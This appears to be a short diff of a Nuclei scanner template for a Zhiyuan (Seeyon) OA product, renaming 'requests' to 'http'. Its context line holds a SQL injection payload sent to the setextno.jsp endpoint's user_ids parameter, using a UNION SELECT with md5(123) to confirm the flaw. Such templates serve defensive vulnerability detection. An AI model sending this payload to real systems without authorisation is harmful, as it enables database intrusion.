@@ -6,7 +6,7 @@ info:
   severity: high
   tags: zhiyuan
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(md5(123)),4#"
